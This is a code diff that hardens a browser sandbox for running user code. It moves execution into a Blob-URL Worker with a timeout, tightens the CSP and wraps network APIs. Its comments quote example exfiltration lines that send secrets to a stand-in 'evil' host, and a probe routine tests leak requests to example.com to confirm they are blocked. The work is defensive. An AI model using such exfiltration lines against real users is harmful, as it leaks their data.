@@ -4,109 +4,175 @@
     <meta charset="utf-8" />
     <title>runner sandbox</title>
     <!--
-      Capability lockdown for the iframe.
+      Capability lockdown.
 
-      The iframe is already isolated via `sandbox="allow-scripts"` (no
+      The iframe is isolated via `sandbox="allow-scripts"` (no
       allow-same-origin → opaque origin → no DOM/cookie/storage access to the
-      host page). This CSP narrows what the user's code can *reach out to*:
-      no network (connect-src 'none' blocks fetch / XHR / WebSocket / Beacon),
-      no images (blocks `new Image().src = "//evil/?data=…"` exfiltration),
-      no media, fonts, or frames. Script is inline so `script-src` doesn't
-      need to match the (opaque-origin) iframe's URL — nothing is loaded
-      over the network.
+      host page). This CSP narrows what code _inside_ the sandbox can reach
+      out to: no network, no images, no media. Two extra notes vs the
+      previous version:
+
+      - `worker-src blob:` is added because actual user-code execution runs
+        in a Worker spawned from a Blob URL. The iframe itself stays as a
+        thin coordinator (forward code to worker, terminate on timeout) — a
+        tight loop in the worker doesn't block the iframe's setTimeout, so
+        the 2s execution limit is real instead of advisory.
+      - `script-src` keeps `'unsafe-inline' 'unsafe-eval'` because the
+        worker uses `new Function`. Inline scope so the blast radius is the
+        opaque-origin worker only.
     -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; style-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'"
+      content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; worker-src blob:; connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; style-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'"
     />
   </head>
   <body>
     <script>
-      // Receives a payload of code from the parent over postMessage, runs it,
-      // and posts the result back.
-      (function () {
+      // Worker source — runs the user's code. Stays as a string so we can
+      // ship it as a Blob URL and inherit the iframe's opaque origin.
+      // Includes the network lockdown so a hostile snippet inside the
+      // worker can't `fetch('//evil/?leak=' + secret)` either.
+      const WORKER_SRC = `
+        {
+          const SELF_ORIGIN = self.location.origin;
+          function sameOrigin(input) {
+            let raw;
+            if (typeof input === "string") raw = input;
+            else if (input instanceof URL) raw = input.href;
+            else if (input && typeof input === "object" && "url" in input) raw = String(input.url);
+            else return false;
+            try { return new URL(raw, SELF_ORIGIN).origin === SELF_ORIGIN; }
+            catch (_e) { return false; }
+          }
+          const ORIG_FETCH = self.fetch.bind(self);
+          self.fetch = (input, init) => {
+            if (!sameOrigin(input)) {
+              return Promise.reject(new TypeError("sandbox: cross-origin fetch blocked"));
+            }
+            return ORIG_FETCH(input, init);
+          };
+          const OrigXHR = self.XMLHttpRequest;
+          class GuardedXHR extends OrigXHR {
+            open(method, url, ...rest) {
+              if (!sameOrigin(url)) throw new TypeError("sandbox: cross-origin XHR blocked");
+              return super.open(method, url, ...rest);
+            }
+          }
+          self.XMLHttpRequest = GuardedXHR;
+          const block = (name) => function () { throw new TypeError("sandbox: " + name + " blocked"); };
+          self.WebSocket = block("WebSocket");
+          self.EventSource = block("EventSource");
+          self.Worker = block("Worker");
+          for (const n of ["SharedWorker", "WebTransport", "WebSocketStream"]) {
+            if (typeof self[n] !== "undefined") self[n] = block(n);
+          }
+        }
+
         function origin(v) {
           try {
             if (v === undefined) return "undefined";
             if (typeof v === "string") return v;
-            if (typeof v === "function")
-              return "[Function " + (v.name || "") + "]";
+            if (typeof v === "function") return "[Function " + (v.name || "") + "]";
             return JSON.stringify(v);
-          } catch (_e) {
-            return String(v);
-          }
+          } catch (_e) { return String(v); }
         }
-        var logs = [];
-        function pushLog(kind) {
-          return function () {
-            var parts = [];
-            for (var i = 0; i < arguments.length; i++)
-              parts.push(origin(arguments[i]));
-            logs.push(kind + " " + parts.join(" "));
-          };
-        }
+        let logs = [];
+        const pushLog = (kind) => (...args) => {
+          const parts = args.map(origin);
+          logs.push(kind + " " + parts.join(" "));
+        };
         console.log = pushLog("log");
         console.info = pushLog("log");
         console.warn = pushLog("warn");
         console.error = pushLog("err");
 
-        // Reject anything that didn't come from our parent. With `sandbox`
-        // (no allow-same-origin) ev.origin is "null" for any sender, so the
-        // useful test is `ev.source === parent`.
-        window.addEventListener("message", function (ev) {
-          if (ev.source !== parent) return;
-          var data = ev.data || {};
-          if (!data.__runner) return;
-          var token = data.__runner;
-          var code = data.code;
+        self.addEventListener("message", async (ev) => {
+          const data = ev.data || {};
+          // probe message — see smoke-coderunner-sandbox
+          if (data.probe) {
+            const probes = {
+              fetch: await (async () => { try { await fetch("https://example.com/?leak"); return "NO_BLOCK"; } catch { return "BLOCKED"; } })(),
+              xhr: (() => { try { const x = new XMLHttpRequest(); x.open("GET", "https://example.com/?leak"); return "NO_BLOCK"; } catch { return "BLOCKED"; } })(),
+              websocket: (() => { try { new WebSocket("wss://example.com"); return "NO_BLOCK"; } catch { return "BLOCKED"; } })(),
+              eventsource: (() => { try { new EventSource("https://example.com"); return "NO_BLOCK"; } catch { return "BLOCKED"; } })(),
+              subworker: (() => { try { new Worker(URL.createObjectURL(new Blob(["self.postMessage(0)"], { type: "application/javascript" }))); return "NO_BLOCK"; } catch { return "BLOCKED"; } })(),
+            };
+            self.postMessage({ probes });
+            return;
+          }
+          const code = data.code;
+          if (typeof code !== "string") return;
           logs = [];
-          (async function () {
-            try {
-              var fn = new Function(
-                "return (async () => { var __result, __vars; " +
-                  code +
-                  "\nreturn { __result: __result, __vars: __vars };" +
-                  " })();",
-              );
-              var ret = await fn();
-              var serializedVars;
-              if (ret.__vars && typeof ret.__vars === "object") {
-                serializedVars = {};
-                for (var k in ret.__vars) {
-                  if (Object.prototype.hasOwnProperty.call(ret.__vars, k)) {
-                    serializedVars[k] = origin(ret.__vars[k]);
-                  }
+          try {
+            const fn = new Function(
+              "return (async () => { var __result, __vars; " +
+                code +
+                "\\nreturn { __result, __vars }; })();",
+            );
+            const ret = await fn();
+            let serializedVars;
+            if (ret.__vars && typeof ret.__vars === "object") {
+              serializedVars = {};
+              for (const k in ret.__vars) {
+                if (Object.prototype.hasOwnProperty.call(ret.__vars, k)) {
+                  serializedVars[k] = origin(ret.__vars[k]);
                 }
               }
-              parent.postMessage(
-                {
-                  __runner: token,
-                  ok: true,
-                  logs: logs,
-                  result:
-                    ret.__result === undefined
-                      ? undefined
-                      : origin(ret.__result),
-                  vars: serializedVars,
-                },
-                "*",
-              );
-            } catch (e) {
-              parent.postMessage(
-                {
-                  __runner: token,
-                  ok: false,
-                  logs: logs,
-                  error: e && e.stack ? e.stack : String(e),
-                },
-                "*",
-              );
             }
-          })();
+            self.postMessage({
+              ok: true,
+              logs,
+              result: ret.__result === undefined ? undefined : origin(ret.__result),
+              vars: serializedVars,
+            });
+          } catch (e) {
+            self.postMessage({ ok: false, logs, error: e && e.stack ? e.stack : String(e) });
+          }
         });
+      `;
 
-        parent.postMessage({ __runner: "ready" }, "*");
-      })();
+      // Coordinator: receive code, spawn inner worker, ferry the response,
+      // terminate on timeout. The iframe's main thread stays idle while the
+      // worker runs, so setTimeout fires on schedule even if the user's code
+      // is a tight loop — the previous version freezed because user code ran
+      // on the iframe's own thread (which is the parent's thread too).
+      const TIMEOUT_MS = 2000;
+
+      window.addEventListener("message", (ev) => {
+        if (ev.source !== parent) return;
+        const data = ev.data || {};
+        if (!data.__runner) return;
+        const token = data.__runner;
+        const blob = new Blob([WORKER_SRC], { type: "application/javascript" });
+        const blobUrl = URL.createObjectURL(blob);
+        const worker = new Worker(blobUrl);
+
+        let settled = false;
+        const finish = (payload) => {
+          if (settled) return;
+          settled = true;
+          clearTimeout(timer);
+          worker.terminate();
+          URL.revokeObjectURL(blobUrl);
+          parent.postMessage({ __runner: token, ...payload }, "*");
+        };
+
+        worker.addEventListener("message", (we) => finish(we.data));
+        worker.addEventListener("error", (we) => finish({ ok: false, logs: [], error: we.message || "worker error" }));
+        const timer = setTimeout(
+          () => finish({ ok: false, logs: [], error: "Timed out after " + TIMEOUT_MS + "ms" }),
+          TIMEOUT_MS,
+        );
+
+        // Probe and code paths share the worker — distinguish by message shape.
+        if (data.probe) {
+          worker.postMessage({ probe: true });
+        } else {
+          worker.postMessage({ code: data.code });
+        }
+      });
+
+      parent.postMessage({ __runner: "ready" }, "*");
     </script>
   </body>
 </html>
